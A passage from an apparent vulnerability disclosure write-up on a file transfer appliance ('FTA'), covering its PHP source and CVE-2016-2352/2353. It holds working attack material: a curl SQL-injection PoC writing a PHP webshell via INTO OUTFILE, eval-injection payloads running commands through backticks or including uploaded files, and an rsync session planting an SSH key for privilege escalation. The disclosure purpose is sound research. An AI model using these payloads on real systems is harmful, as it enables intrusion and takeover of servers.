        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_name LIKE \&amp;#39;%&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;%%&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;t_mail_server.c_user_id LIKE \&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The parameters passed onto the function &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt;  will be assembled into SQL statements. Among all the functions joining the assembling, &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; is the most crucial one.  &lt;br /&gt;
In the function &lt;code class=&quot;highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt;, every parameter is protected by the string &lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; except for &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;. Judging from the coding style of the source code, it might be a result of oversight. Therefore, SQL Injection can be triggered by sending out corresponding parameters according to the program flow.&lt;/p&gt;

&lt;p&gt;In addition, FTA database user has root privileges with FILE_PRIV option enabled. By exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; and writing their own PHP code to write-enabled directory, user will be able to execute code remotely!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api -d &lt;span class=&quot;s2&quot;&gt;&amp;quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&amp;#39; OR 1=1 LIMIT 1 INTO OUTFILE &amp;#39;/home/seos/courier/themes/templates/.cc.php&amp;#39; LINES TERMINATED BY 0x3c3f...#&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The created PHP file will be located at&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known-Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;In the previous vulnerability, one requirement to execute code remotely is the existence of a write-enabled directory for injecting webshell. But in reality, chances are there is no write-enabled directory available, thus fail to execute code through SQL Injection. But there is another way to help us accomplish RCE.&lt;/p&gt;

&lt;p&gt;The precondition of this vulnerability is &lt;strong&gt;Known-Secret-Key stored in the database&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is not a problem, since the database can be accessed with the SQL Injection vulnerability mentioned earlier. Also, although there are some parameter filters in the code, they can be bypassed!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;fc&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/(.+)\(.*\)/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_session_cache&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;delete_user_contact&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;valid_password&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_update_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_password_format_disallowed&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_email_verified&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_exist_allow_direct_download&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;user_profile_auth&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get_user_contact_list&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/[\\\/&amp;quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(count(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, array(&amp;quot;nickname&amp;quot;=&amp;gt;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;))));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p1&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;\\$&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;echo(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;(&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;, &amp;quot;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;));&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;If Known-Secret-Key has been acquired, the output of decrypt( $_POST[fc] ) will be controllable. And despite that the succeeding regular expressions work as a function name whitelist filter, they do not filter parameters.  &lt;br /&gt;
Therefore, the only restriction for injecting random codes in the parameters is to exclude &lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;)&lt;/code&gt; in the strings. But thanks to the flexible characteristic of PHP, there are lots of ways to manipulate, just to name two examples here.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Execute system commands directly by using backticks (`)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A more elegant way: use the syntax INCLUDE to include the tmp_name of the uploaded files, so that any protection will give way.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;After gaining PHP page privileges, we discovered that the privileges were assigned to user nobody. In order to engage in advanced recon, the web environment had been observed. After the observation, two possible privilege escalation vulnerabilities were identified.&lt;/p&gt;

&lt;h5 id=&quot;1-incorrect-rsync-configuration&quot;&gt;1. Incorrect Rsync Configuration&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat/log/kennel.log&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;/home/soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;soggycat&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The module name soggycat is readable and writable to anyone for the directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt;, therefore the SSH Key can be written into &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/soggycat/.ssh/&lt;/code&gt; and then use the soggycat credential to login.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        &lt;span class=&quot;m&quot;&gt;4096&lt;/span&gt; 2016/01/29 18:13:41 .
-rw-r--r--         &lt;span class=&quot;m&quot;&gt;606&lt;/span&gt; 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys .
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat id_dsa.pub &amp;gt;&amp;gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

